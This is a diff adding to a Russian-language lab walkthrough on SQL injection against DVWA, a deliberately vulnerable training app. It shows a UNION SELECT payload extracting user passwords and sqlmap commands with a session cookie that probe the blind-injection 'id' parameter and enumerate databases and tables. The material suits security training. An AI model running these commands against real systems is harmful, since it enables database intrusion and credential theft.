@@ -78,3 +78,22 @@ id=1 UNION SELECT USER,PASSWORD FROM users#
 
 ![image](https://user-images.githubusercontent.com/53438664/205756383-f86ea29b-c263-4c10-8d33-91e69c1a3bc1.png)
 
+## SQLMap
+Воспользуемся утилитой для поиска уязвимых параметров запроса.
+```sh
+sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id
+```
+![image](https://user-images.githubusercontent.com/53438664/205756897-01a9c86b-0c00-46b6-959b-33074863517b.png)
+
+В результате поиска выявлена уязвимость типа _boolean-based blind_ и _time-based blind_ у параметра `id`.
+Получим список имеющихся баз данных с помощью команды:
+```sh
+sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id --dbs
+```
+![image](https://user-images.githubusercontent.com/53438664/205757631-3e26ad8c-e149-4094-a783-f957e27f251d.png)
+
+Получим список имеющихся таблиц базы данных `dvwa` с помощью команды:
+```sh
+sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id -D dvwa --tables
+```
+![image](https://user-images.githubusercontent.com/53438664/205757911-51b68d62-c36c-40f0-b10d-d2ff7960e129.png)
